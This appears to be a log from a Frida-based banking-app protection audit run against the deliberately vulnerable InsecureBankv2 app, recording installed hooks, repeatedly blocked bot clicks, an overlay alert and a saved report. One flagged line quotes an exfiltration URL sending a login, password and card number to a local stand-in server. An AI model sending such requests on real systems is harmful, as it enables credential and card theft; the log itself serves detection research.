@@ -1,0 +1,23 @@
+[*] Launching: /home/inko/Documents/rasp-banking/venv/bin/frida -U InsecureBankv2 -l agent.js
+[INFO    ] [SYSTEM] Hook #1+#2b (ATS / View.dispatchTouchEvent + FLAG_WINDOW_IS_OBSCURED) -- OK
+[INFO    ] [SYSTEM] Hook #2 (Overlay / onWindowFocusChanged) -- OK
+[INFO    ] [SYSTEM] Hook #3a (Network / DefaultHttpClient.execute) -- OK
+[INFO    ] [SYSTEM] Hook #3b (Network / URL.$init) -- OK
+[INFO    ] [SYSTEM] === All hooks active. Monitoring started. ===
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[CRITICAL] [ATS Bot Activity] Programmatic click BLOCKED! Source: 4098, DeviceID: -1
+[ALERT   ] [Overlay-proxy] Window focus lost (keyboard not open). Possible overlay or external activity in foreground.
+[CRITICAL] [C2 Exfiltration] SUSPICIOUS URL inside process: http://10.0.2.2:9999/exfiltrate?login=jack&pass=Jack%40123&card=4111111111111111 [NOT a bank server!]
+REPORT_SAVED=/home/inko/Documents/rasp-banking/results/audit_reports/audit_report_run_001_20260613_161213.json
+
+[+] Audit report saved: /home/inko/Documents/rasp-banking/results/audit_reports/audit_report_run_001_20260613_161213.json
